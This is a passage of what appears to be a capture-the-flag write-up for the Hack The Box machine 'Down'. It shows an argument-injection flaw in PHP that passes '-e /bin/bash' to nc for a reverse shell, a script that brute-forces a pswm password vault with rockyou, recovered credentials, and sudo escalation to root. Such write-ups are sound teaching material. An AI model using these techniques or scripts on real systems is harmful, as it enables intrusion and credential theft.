+      <span class="k">echo</span> <span class="s2">"&lt;font size=+1&gt;It is down for everyone! =␔&lt;/font&gt;&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s1">'&lt;div class="output" id="outputSection"&gt;'</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s1">'&lt;font color=red size=+1&gt;Only protocols http or https allowed.&lt;/font&gt;'</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>On the third line there’s a <code class="language-plaintext highlighter-rouge">preg_match</code> looking for <code class="language-plaintext highlighter-rouge">http://</code> or <code class="language-plaintext highlighter-rouge">https://</code> at the start of the <code class="language-plaintext highlighter-rouge">$url</code>. Then it actually uses <code class="language-plaintext highlighter-rouge">exec</code> to run the <code class="language-plaintext highlighter-rouge">curl</code> binary, though wrapped in <code class="language-plaintext highlighter-rouge">escapeshellcmd</code> to block command injection.</p>
+<h4 id="socket-code">Socket Code</h4>
+<p>The expertmode code starts by validating that the given IP is an IP:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'tcp'</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'port'</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$ip</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">]);</span>
+  <span class="nv">$valid_ip</span> <span class="o">=</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="no">FILTER_VALIDATE_IP</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Then it does the same for the port:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nv">$port</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'port'</span><span class="p">]);</span>
+  <span class="nv">$port_int</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$port</span><span class="p">);</span>
+  <span class="nv">$valid_port</span> <span class="o">=</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$port_int</span><span class="p">,</span> <span class="no">FILTER_VALIDATE_INT</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Only if both are valid does it continue. then it uses <code class="language-plaintext highlighter-rouge">nc</code> to connect to the IP / port:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span> <span class="nv">$valid_ip</span> <span class="o">&amp;&amp;</span> <span class="nv">$valid_port</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$rc</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$output</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+    <span class="nv">$ec</span> <span class="o">=</span> <span class="nb">escapeshellcmd</span><span class="p">(</span><span class="s2">"/usr/bin/nc -vz </span><span class="nv">$ip</span><span class="s2"> </span><span class="nv">$port</span><span class="s2">"</span><span class="p">);</span>
+    <span class="nb">exec</span><span class="p">(</span><span class="nv">$ec</span> <span class="mf">.</span> <span class="s2">" 2&gt;&amp;1"</span><span class="p">,</span><span class="nv">$output</span><span class="p">,</span><span class="nv">$rc</span><span class="p">);</span>
+</code></pre></div></div>
+<h3 id="exploit">Exploit</h3>
+<h4 id="vulnerability">Vulnerability</h4>
+<p>The problem with the above code is that it converts the <code class="language-plaintext highlighter-rouge">$port</code> value to an int (<code class="language-plaintext highlighter-rouge">$port_int</code>) and validates that value, but then it uses the original input in the command!</p>
+<p><code class="language-plaintext highlighter-rouge">intval</code> will get the valid integer from the start of the string:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">php &gt; </span><span class="k">echo</span> <span class="nb">intval</span><span class="p">(</span><span class="s2">"1234 this is a test"</span><span class="p">);</span>
+<span class="go">1234
+</span></code></pre></div></div>
+<p>So this code turns the string into an int, validates that it’s an int, and then uses the original string!</p>
+<p><code class="language-plaintext highlighter-rouge">escapeshellcmd</code> will prevent command injection, but it will not prevent parameter injection. So I can send <code class="language-plaintext highlighter-rouge">-e /bin/bash</code> and try to get a shell!</p>
+<h4 id="shell">Shell</h4>
+<p>Client side validation rules prevent me from entering my payload directly into the form:</p>
+<picture>
+<source srcset="/img/image-20250502180111558.webp" type="image/webp"/>
+<img alt="image-20250502180111558" class="include_image" loading="lazy" src="/img/image-20250502180111558.png"/>
+</picture>
+<p>I’ll send a legit request to Burp Repeater, and add my payload:</p>
+<picture>
+<source srcset="/img/image-20250502180428208.webp" type="image/webp"/>
+<img alt="image-20250502180428208" class="include_image" loading="lazy" src="/img/image-20250502180428208.png"/>
+</picture>
+<p>This request just hangs, but after a few seconds, there’s a connection at my listening <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.234.87 45706
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">nc -e /bin/bash</code> doesn’t print a prompt, but I’ll enter <code class="language-plaintext highlighter-rouge">id</code> and it returns the results:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.234.87 45706
+</span><span class="gp">‍</span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<p>I’ll upgrade my shell using the <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">standard trick</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/var/www/html$ </span>script /dev/null <span class="nt">-c</span> /bin/bash
+<span class="go">Script started, output log file is '/dev/null'.
+</span><span class="gp">www-data@down:/var/www/html$ </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+</span><span class="gp">‍</span><span class="w">            </span>reset
+<span class="go">reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@down:/var/www/html$ </span><span class="w">
+</span></code></pre></div></div>
+<p>The user flag is in www-data’s home directory in the <code class="language-plaintext highlighter-rouge">html</code> folder:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/var/www/html$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">index.php  logo.png  style.css  user_aeT1xa.txt
+</span><span class="gp">www-data@down:/var/www/html$</span><span class="w"> </span><span class="nb">cat </span>user_aeT1xa.txt 
+<span class="go">d4bc94b386ef7c8113698a8c4951cacd
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="web-configuration">Web Configuration</h4>
+<p>The only webserver directory in <code class="language-plaintext highlighter-rouge">/var/www</code> is <code class="language-plaintext highlighter-rouge">html</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/var/www$</span><span class="w"> </span><span class="nb">ls</span>       
+<span class="go">html
+</span></code></pre></div></div>
+<p>It contains only the one PHP page, an image, and a stylesheet:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/var/www$</span><span class="w"> </span><span class="nb">ls </span>html/
+<span class="go">index.php  logo.png  style.css
+</span></code></pre></div></div>
+<p>The only Apache configuration file shows this one site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/etc/apache2/sites-enabled$ </span><span class="nb">cat </span>000-default.conf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'#'</span> | <span class="nb">grep</span> <span class="nb">.</span>
+<span class="go">&lt;VirtualHost *:80&gt;
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+&lt;/VirtualHost&gt;
+</span></code></pre></div></div>
+<h4 id="users">Users</h4>
+<p>There is one home directory in <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">aleks
+</span></code></pre></div></div>
+<p>Interestingly, www-data can access it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home/aleks$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-type</span> f
+<span class="go">./.bashrc
+./.sudo_as_admin_successful
+./.local/share/pswm/pswm
+find: './.cache': Permission denied
+find: './.ssh': Permission denied
+./.profile
+./.bash_logout
+</span></code></pre></div></div>
+<p>www-data can’t access <code class="language-plaintext highlighter-rouge">.cache</code> or <code class="language-plaintext highlighter-rouge">.ssh</code>, but there’s another interesting file, <code class="language-plaintext highlighter-rouge">pswm</code>.</p>
+<h4 id="pswm">pswm</h4>
+<p><a href="https://github.com/Julynx/pswm">pswm</a> is a:</p>
+<blockquote>
+<p><em>A simple command line password manager written in Python.</em></p>
+</blockquote>
+<p>It’s installed in <code class="language-plaintext highlighter-rouge">/usr/bin</code> on Down:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home/aleks$</span><span class="w"> </span>which pswm
+<span class="go">/usr/bin/pswm
+</span></code></pre></div></div>
+<p>Running it as www-data errors out:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home/aleks$</span><span class="w"> </span>pswm
+<span class="go">Traceback (most recent call last):
+  File "/usr/bin/pswm", line 393, in &lt;module&gt;
+    PASS_VAULT_FILE = get_xdg_data_path("pswm")
+  File "/usr/bin/pswm", line 89, in get_xdg_data_path
+    return _get_xdg_path(env="XDG_DATA_HOME",
+  File "/usr/bin/pswm", line 60, in _get_xdg_path
+    os.makedirs(config, exist_ok=True)
+  File "/usr/lib/python3.10/os.py", line 215, in makedirs
+    makedirs(head, exist_ok=exist_ok)
+  File "/usr/lib/python3.10/os.py", line 215, in makedirs
+    makedirs(head, exist_ok=exist_ok)
+  File "/usr/lib/python3.10/os.py", line 225, in makedirs
+    mkdir(name, mode)
+PermissionError: [Errno 13] Permission denied: '/var/www/.local'
+</span></code></pre></div></div>
+<p>It’s trying to read in <code class="language-plaintext highlighter-rouge">/var/www/.local</code> and failing. I could try to make that directory, but www-data doesn’t have permissions:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home/aleks$</span><span class="w"> </span><span class="nb">mkdir</span> <span class="nt">-p</span> ~/.local/share/pswm 
+<span class="go">mkdir: cannot create directory '/var/www/.local': Permission denied
+</span></code></pre></div></div>
+<p>The file itself looks like base64-encoded and likely encrypted data:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home/aleks$</span><span class="w"> </span><span class="nb">cat</span> .local/share/pswm/pswm 
+<span class="go">e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
+</span></code></pre></div></div>
+<p>There are “*” separating four different encoded strings.</p>
+<h3 id="decrypt-password-vault">Decrypt Password Vault</h3>
+<h4 id="manually">Manually</h4>
+<p>The <code class="language-plaintext highlighter-rouge">pswm</code> script is not that long, and lives in one file. On <a href="https://github.com/Julynx/pswm/blob/main/pswm#L322-L345">line 322</a>, there’s a function, <code class="language-plaintext highlighter-rouge">encrypted_file_to_lines</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">encrypted_file_to_lines</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="n">master_password</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">
+    This function opens and decrypts the password vault.
+
+    Args:
+        file_name (str): The name of the file containing the password vault.
+        master_password (str): The master password to use to decrypt the
+        password vault.
+
+    Returns:
+        list: A list of lines containing the decrypted passwords.
+    </span><span class="sh">"""</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">isfile</span><span class="p">(</span><span class="n">file_name</span><span class="p">):</span>
+        <span class="k">return</span> <span class="sh">""</span>
+
+    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+        <span class="n">encrypted_text</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+
+    <span class="n">decrypted_text</span> <span class="o">=</span> <span class="n">cryptocode</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted_text</span><span class="p">,</span> <span class="n">master_password</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">decrypted_text</span> <span class="ow">is</span> <span class="bp">False</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="n">decrypted_lines</span> <span class="o">=</span> <span class="n">decrypted_text</span><span class="p">.</span><span class="nf">splitlines</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">decrypted_lines</span>
+</code></pre></div></div>
+<p>It’s using the <code class="language-plaintext highlighter-rouge">cryptocode</code> package’s <code class="language-plaintext highlighter-rouge">decrypt</code> function with the text from the file and the password. Seems easy enough to replicate. I don’t need to know the algorithm, as long as I try the same call that the legit program makes.</p>
+<p>This script reads in a <code class="language-plaintext highlighter-rouge">pwsm</code> file and a wordlist, and then tries each word. A bit of experimentation shows that <code class="language-plaintext highlighter-rouge">cryptocode.decrypt</code> returns <code class="language-plaintext highlighter-rouge">False</code> if the key is wrong.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># /// script
+# requires-python = "&gt;=3.12"
+# dependencies = [
+#     "cryptocode",
+# ]
+# ///
+</span><span class="kn">import</span> <span class="n">cryptocode</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;pwsm file&gt; &lt;wordlist&gt;</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+
+
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">pwsm</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">passwords</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">().</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">'</span><span class="s">ignore</span><span class="sh">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+
+
+<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
+        <span class="n">pt</span> <span class="o">=</span> <span class="n">cryptocode</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">pwsm</span><span class="p">,</span> <span class="n">password</span><span class="p">.</span><span class="nf">strip</span><span class="p">())</span>
+        <span class="nf">if </span><span class="p">(</span><span class="n">pt</span><span class="p">):</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Found password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
+            <span class="k">break</span>
+</code></pre></div></div>
+<p>I added the dependency metadata at the top with <code class="language-plaintext highlighter-rouge">uv add --script brute-pwsm.py cryptocode</code>, and now it runs with <code class="language-plaintext highlighter-rouge">uv</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run brute-pwsm.py   
+<span class="go">Installed 2 packages in 9ms
+usage: brute-pwsm.py &lt;pwsm file&gt; &lt;wordlist&gt;
+</span></code></pre></div></div>
+<p>It takes a bout three seconds to find the password, “flower”:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">time </span>uv run brute-pwsm.py pswm /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
+<span class="go">Found password: flower
+pswm    aleks   flower
+aleks@down      aleks   1uY3w22uc-Wr{xNHR~+E
+
+real    0m3.321s
+user    0m2.098s
+sys     0m1.217s
+</span></code></pre></div></div>
+<p>There’s a password for the aleks account on Down.</p>
+<h4 id="pswm-decryptor">pswm-decryptor</h4>
+<p>There is a tool on GitHub called <a href="https://github.com/seriotonctf/pswm-decryptor">pswm-decryptor</a>. I found it quite difficult to find, but once I have it, it’s made to do just what I did above, take a wordlist and an encrypted file and find the password.</p>
+<p>I’ll save a copy of the script on my host. It requires two dependencies, which I’ll add as in-line meta using <code class="language-plaintext highlighter-rouge">uv</code> (see <a href="/cheatsheets/uv#">my uv Cheatsheet</a> for details):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv add <span class="nt">--script</span> pswm-decrypt.py cryptocode prettytable
+<span class="go">Updated `pswm-decrypt.py`
+</span></code></pre></div></div>
+<p>Now I can run the script with <code class="language-plaintext highlighter-rouge">uv</code> without having to worry about virtual environments:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run pswm-decrypt.py 
+<span class="go">Installed 4 packages in 39ms
+usage: pswm-decrypt.py [-h] -f FILE -w WORDLIST
+pswm-decrypt.py: error: the following arguments are required: -f/--file, -w/--wordlist
+</span></code></pre></div></div>
+<p>It takes just over a second with <code class="language-plaintext highlighter-rouge">rockyou.txt</code> to find the password, decrypt the file, and print the results:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">time </span>uv run pswm-decrypt.py <span class="nt">-f</span> pswm <span class="nt">-w</span> /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
+<span class="go">[+] Master Password: flower
+[+] Decrypted Data:
++------------+----------+----------------------+
+| Alias      | Username | Password             |
++------------+----------+----------------------+
+| pswm       | aleks    | flower               |
+| aleks@down | aleks    | 1uY3w22uc-Wr{xNHR~+E |
++------------+----------+----------------------+
+
+real    0m1.879s
+user    0m1.796s
+sys     0m0.075s
+</span></code></pre></div></div>
+<p>This output is prettier than mine.</p>
+<h3 id="shell-1">Shell</h3>
+<h4 id="shell-as-aleks">Shell as aleks</h4>
+<p>The password works with <code class="language-plaintext highlighter-rouge">su</code> to get a shell as aleks:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/var/www$</span><span class="w"> </span>su - aleks
+<span class="go">Password: 
+</span><span class="gp">aleks@down:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>It also works for SSH:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'1uY3w22uc-Wr{xNHR~+E'</span> ssh aleks@10.129.234.87
+<span class="go">Warning: Permanently added '10.129.234.87' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-138-generic x86_64)
+
+ System information as of Fri May  2 10:49:31 PM UTC 2025
+
+  System load:           0.0
+  Usage of /:            57.6% of 9.75GB
+  Memory usage:          15%
+  Swap usage:            0%
+  Processes:             156
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.234.87
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:c2e
+</span><span class="gp">aleks@down:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<h4 id="shell-as-root-1">Shell as root</h4>
+<p>aleks can run any command as any user with <code class="language-plaintext highlighter-rouge">sudo</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">aleks@down:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">[sudo] password for aleks: 
+Matching Defaults entries for aleks on down:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User aleks may run the following commands on down:
+    (ALL : ALL) ALL
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">sudo -i</code> will return a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">aleks@down:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-i</span> 
+<span class="gp">root@down:~#</span><span class="w">
+</span></code></pre></div></div>
+<p>And I can get the root flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@down:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">87bb9869************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/06/17/htb-down.html"></a>
+</article>
